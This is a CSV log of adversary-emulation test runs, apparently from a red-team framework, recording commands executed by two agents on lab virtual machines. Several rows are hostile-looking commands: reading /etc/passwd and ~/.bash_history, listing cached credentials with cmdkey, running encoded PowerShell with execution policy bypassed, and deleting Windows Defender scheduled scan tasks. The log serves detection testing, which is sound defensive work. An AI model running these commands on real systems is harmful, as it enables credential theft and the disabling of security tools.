Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2025-10-01T20:42:02Z,Custom - Encoded PowerShell Test (110000),bydmzm,onisa-VirtualBox,52772,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt
2025-10-01T20:42:02Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,2880,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
2025-10-01T20:42:27Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,52782,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T20:42:27Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,5308,cmdkey /list,cmdkey /list
2025-10-01T20:43:23Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,52789,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T20:43:23Z,WMI Reconnaissance List Remote Services,maqmre,DESKTOP-B2K36HT,760,wmic /node:"127.0.0.1" service where (caption like "%Spooler%"),wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
2025-10-01T20:44:13Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,52808,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T20:44:13Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,6308,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T20:45:14Z,Dump history,bydmzm,onisa-VirtualBox,52816,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T20:45:14Z,iwr or Invoke Web-Request download,maqmre,DESKTOP-B2K36HT,2796,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
